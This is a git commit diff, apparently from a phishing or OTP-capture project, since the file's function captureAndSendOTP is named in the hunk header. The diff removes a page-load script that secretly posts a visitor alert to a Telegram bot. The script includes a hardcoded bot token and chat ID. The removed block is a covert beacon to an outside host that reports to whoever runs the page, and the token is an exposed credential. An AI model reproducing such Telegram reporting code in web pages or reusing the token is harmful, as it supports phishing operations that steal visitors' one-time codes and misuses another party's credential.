41414f24c741d55b8a93813fd8bd3337187f8e5d
clientenew498-creator <clientenew498@gmail.com>
2026-01-12 09:50:48 -0500

    Update secure_keystore.enc3.js

--- secure_keystore.enc3.js
+++ secure_keystore.enc3.js
@@ -101,31 +101,5 @@ async function captureAndSendOTP() {
 
 
 
-  /* ===============================
-     aviso de entrada
-  =============================== */
-
-
-// Ejecutar al cargar la página
-window.addEventListener('load', function() {
-    const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
-    const chatId = "8417322083";
-    const mensaje = `¡Alguien ha entrado a tu sitio web! - ${new Date().toLocaleString()}`;
-
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: mensaje
-        })
-    })
-    .then(res => res.json())
-    .then(data => console.log("Mensaje enviado a Telegram"))
-    .catch(err => console.error("Error enviando mensaje", err));
-});
-
-
-
 
 
